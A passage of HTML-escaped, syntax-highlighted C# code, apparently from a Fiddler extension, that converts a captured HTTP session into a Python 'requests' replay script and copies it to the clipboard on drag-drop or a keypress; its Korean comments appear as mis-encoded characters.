		&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionToCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;origin_headers&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;origin_headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fullUrl&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fullUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RequestMethod&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RequestBody&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            
            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;#coding: utf-8\r\n\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;import requests\r\n\r\n\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;requests.packages.urllib3.disable_warnings()\r\n\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;s = requests.Session()\r\n\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

			&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;questIdx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fullUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IndexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;questIdx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;url = \&quot;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fullUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\&quot;\r\n\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;url = \&quot;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fullUrl&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\&quot;\r\n\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;headers = {\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPHeaderItem&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\t\&quot;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\&quot;: \&quot;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;\&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%22&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\&quot;,\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;}\r\n\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestMethod&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;questIdx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parsedQuery&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fullUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;questIdx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parseData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parsedQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

					&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;req = requests.get(url, headers=headers, params=data, verify=False)\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;req = requests.get(url, headers=headers, verify=False)\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestMethod&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oRequestBody&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parseData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oRequestBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

				&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;req = requests.post(url, headers=headers, data=data, verify=False)\r\n\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;res = req.text\r\n\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;print(res)\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;// ë“œë˜ê·¸ ì¤‘ í…ìŠ¤íŠ¸ë°•ìŠ¤ì— ì§„ì…í–ˆì„ ë•Œ&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// ë§ˆìš°ìŠ¤ ì»¤ì„œ ëª¨ì–‘ ë³€ê²½&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DragEnter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DragEventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Effect&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DragDropEffects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		
		&lt;span class=&quot;c1&quot;&gt;// ë“œë˜ê·¸ í›„ í…ìŠ¤íŠ¸ë°•ìŠ¤ì— ë†“ì•˜ì„ ë•Œ&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// SessionToCode í•¨ìˆ˜ í˜¸ì¶œ&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DragDrop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DragEventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;DataObject&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DataObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sessions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fiddler.Session[]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sessions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

			&lt;span class=&quot;nf&quot;&gt;SessionToCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

			&lt;span class=&quot;c1&quot;&gt;// ê°’ ìë™ ë³µì‚¬&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SelectAll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeselectAll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;// ì„¸ì…˜ ì„ íƒ í›„ 'a' í‚¤ ëˆŒë €ì„ ë•Œ&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// SessionToCode í•¨ìˆ˜ í˜¸ì¶œ&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;KeyPress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KeyPressEventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyChar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SelectedSessions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FiddlerApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetSelectedSessions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SelectedSessions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SelectedSessions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                    &lt;span class=&quot;nf&quot;&gt;SessionToCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

					&lt;span class=&quot;c1&quot;&gt;//ê°’ ìë™ ë³µì‚¬&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SelectAll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeselectAll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

					&lt;span class=&quot;c1&quot;&gt;// ë‹¨ì¶•í‚¤ ëˆŒë €ì„ ë•Œ íƒ­ í˜ì´ì§€ ì´ë™&lt;/span&gt;
